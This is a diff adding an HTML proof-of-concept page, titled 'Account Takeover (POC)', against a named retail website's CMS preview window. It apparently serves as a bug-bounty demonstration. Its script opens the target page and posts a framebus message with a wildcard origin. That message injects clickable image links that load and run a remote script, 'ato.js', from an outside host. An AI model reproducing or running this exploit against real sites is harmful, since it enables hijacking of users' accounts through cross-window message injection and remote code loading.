@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATO - HALARA</title>
+    <style>
+        body {
+            font-family: Inter, system-ui, Segoe UI, Roboto, "Helvetica Neue", Arial;
+            background: #f7f9fb;
+            color: #111;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #0b72ff;
+        }
+        p {
+            line-height: 1.6;
+        }
+        .exploit-btn {
+            background: #0b72ff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.2s;
+        }
+        .exploit-btn:hover {
+            background: #0960d9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Account Takeover (POC)</h1>
+        <p>Click the button below to trigger the exploit against the target window.</p>
+        <button class="exploit-btn" onclick="triggerExploit()">Trigger Exploit</button>
+
+        <script>
+            function triggerExploit() {
+                var w = window.open('https://eur.halara.com/cmspreview');
+                setTimeout(function() {
+                    var msg = '/*framebus*/' + JSON.stringify({
+                        event: 'message',
+                        origin: '*',
+                        eventData: {
+                            dataIndex: 1,
+                            contents: [{
+                                type: 'collections',
+                                title: 'Click any image',
+                                position: 1,
+                                data: [
+                                    { url: 'javascript:import("https://daemoon.me/Halara/ato.js")', img: 'https://daemoon.me/daemoon.jpeg', title: 'x' },
+                                    { url: 'javascript:import("https://daemoon.me/Halara/ato.js")', img: 'https://daemoon.me/daemoon.jpeg', title: 'x' },
+                                    { url: 'javascript:import("https://daemoon.me/Halara/ato.js")', img: 'https://daemoon.me/daemoon.jpeg', title: 'x' }
+                                ]
+                            }]
+                        }
+                    });
+                    w.postMessage(msg, '*');
+                }, 3000);
+            }
+        </script>
+    </div>
+</body>
+</html>
